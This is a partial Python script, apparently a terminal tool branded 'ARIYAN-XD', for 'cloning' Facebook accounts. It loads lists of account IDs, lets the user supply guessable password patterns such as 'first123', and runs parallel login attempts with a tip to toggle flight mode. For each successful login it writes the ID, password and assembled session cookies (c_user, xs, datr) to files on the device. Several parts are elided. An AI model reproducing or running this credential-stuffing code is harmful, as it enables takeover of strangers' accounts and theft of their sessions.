...
\x1b[38;5;41m         ██   ████ ██ ███████ ███████ 
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m   AUTHOR        \033[1;31m    =\033[1;36m    ARIYAN-XD
\033[1;32m   VERSION          \033[1;31m =\033[1;36m    0.1
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;35m""")
def line():
	print(f'\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;36m')
...
def main():
	clear()
	print(' \033[1;31m[\033[1;32m1\033[1;31m]\033[1;32m File Cloning \n \033[1;31m[\033[1;32m2\033[1;31m]\033[1;32m Create file \n \033[1;31m[\033[1;32m3\033[1;31m]\033[1;32m Random cloning \n \033[1;31m[\033[1;32m4\033[1;31m]\033[1;32m Random mail clone')
	line()
	x=input(' \033[1;31m[\033[1;32m?\033[1;31m]\033[1;32m Choice : ')
	if x =='1':
		file()
	elif x=='2':
...
def file():
	clear()
	file = input(' \033[1;31m[\033[1;32m!\033[1;31m]\033[1;32m Put file path :\033[1;32m ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print('\033[1;37m File location not found ');time.sleep(2);main()
	line()
	print(' \033[1;31m[\033[1;32m1\033[1;31m]\033[1;32m Method 1 \033[1;31m[\033[1;32mMIX\033[1;31m]\033[1;32m \n \033[1;31m[\033[1;32m2\033[1;31m]\033[1;32m Method 2 \033[1;31m[\033[1;32mMIX\033[1;31m]\033[1;32m\n \033[1;31m[\033[1;32m3\033[1;31m]\033[1;32m Method 3 \033[1;31m[\033[1;32mNEW\033[1;31m]\033[1;32m\033[1;37m ')
	line()
	mthd = input(' \033[1;31m[\033[1;32m?\033[1;31m]\033[1;32m Choice: ')
	plist=[]
	clear()
	try:
		ps_limit = int(input('\033[1;31m [\033[1;32m!\033[1;31m]\033[1;32m How Many Pasword You Want To Add :  '))
	except:
		ps_limit =1
	line()
	print(' \033[1;31m[\033[1;32m!\033[1;31m]\033[1;32m first last\033[1;33m, \033[1;32mfirtslast\033[1;33m, \033[1;32mfirst123')
	line()
	for i in range(ps_limit):
		plist.append(input(f' \033[1;37m\033[1;31m[\033[1;32m>\033[1;31m]\033[1;32m Put Password No \033[1;31m{i+1}\033[1;32m: '))
	line()
	sim_id=''
	try:
		...
		for i in fbcr:
			total+=1
			print(f' \033[1;32m[\033[1;31m{total}\033[1;32m] {i}')
		select = input(' \033[1;31m[\033[1;32m!\033[1;31m]\033[1;32m Put sim network:  ')
		if select == '1':
	...
	with tred(max_workers=20) as aking:
		clear()
		tl = str(len(fo))
		print(' \033[1;31m[\033[1;32m>\033[1;31m]\033[1;32m Total account : \033[1;31m'+tl)
		print(" \033[1;31m[\033[1;32m>\033[1;31m]\033[1;32m Use Flight Mode\033[1;37m")
		line()
		for user in fo:
	...
	try:
		...
		for pas in passlist:
			...
			if "session_key" in po:
				...
				oks.append(ids)
				open('/sdcard/NILL-XD/AKING-R-OK.txt','a').write(uid+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/NILL-XD/AKING-R-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
